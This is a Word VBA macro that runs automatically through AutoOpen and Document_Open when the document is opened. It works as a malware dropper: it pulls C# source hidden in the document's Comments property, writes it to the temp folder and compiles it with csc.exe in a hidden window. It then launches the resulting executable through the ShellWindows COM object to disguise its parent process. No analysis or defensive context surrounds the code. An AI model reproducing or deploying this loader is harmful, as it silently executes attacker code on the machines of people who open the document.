Sub Exec()
    Dim comment As String
    Dim fSo As Object
    Dim dropper As Object
    Dim wsh As Object
    Dim temp As String
    Dim command As String
    
    temp = LCase(Environ("TEMP"))
    
    Set fSo = CreateObject("Scripting.FileSystemObject")
    Set dropper = fSo.CreateTextFile(temp & "\code.cs", True)
    
    comment = ActiveDocument.BuiltInDocumentProperties("Comments").Value
    
    dropper.WriteLine comment
    dropper.Close
    
    Set wsh = CreateObject("WScript.Shell")
    command = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Net.Http.dll"" /out:" & temp & "\code.exe " & temp & "\code.cs"
    ''MsgBox (command)
    wsh.Run command, 0
    ''Sleep 3000
    
    Dim com As Object
    Set com = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
    com.Item.Document.Application.ShellExecute "powershell", temp & ".\code.exe", "", Null, 0
    Set com = Nothing

    Set fSo = Nothing
    Set dropper = Nothing
    Set wsh = Nothing
End Sub

Sub AutoOpen()
Exec
End Sub

Sub Document_Open()
Exec
End Sub